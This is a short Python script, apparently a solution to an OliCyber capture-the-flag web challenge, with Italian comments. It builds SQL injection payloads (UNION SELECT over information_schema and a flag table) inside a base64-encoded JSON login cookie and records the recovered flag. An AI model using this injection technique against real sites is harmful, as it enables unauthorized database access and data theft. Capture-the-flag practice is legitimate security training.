#! /usr/bin/env python3

from base64 import b64encode
import requests
from bs4 import BeautifulSoup

url = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php'
conn = requests.Session()

# qui provavo a prendere tutti i cookie con un certo id, ma ladmin a quanto pare non ce
i = 0
while True:

	# test a caso che ho fatto dopo
	# res = conn.get(url, cookies={"login":b64encode(('{"ID":"1 UNION select concat(stuf) FROM users LIMIT 10 OFFSET '+str(i)+'"}').encode()).decode()})

	# principale per prendere informazioni sui tables che erano presenti
	# res = conn.get(url, cookies={"login":b64encode(('{"ID":"1 UNION select table_name FROM information_schema.TABLES LIMIT 10 OFFSET '+str(i)+'"}').encode()).decode()})


	# richieste finali qua
	# res = conn.get(url, cookies={"login":b64encode(('{"ID":"1 UNION select * FROM here_is_the_flag LIMIT 10 OFFSET '+str(i)+'"}').encode()).decode()})
	# facendo questo si finisce : flag{W4sH_y0ur_HaNd5_b3f0Re_e4tin6_c0oki3s!}
	soup = BeautifulSoup(res.content, 'html.parser')
	findings = soup.find("h1")
	if "Welcome !" in findings: break;
	else: print(findings, i)
	i+=1

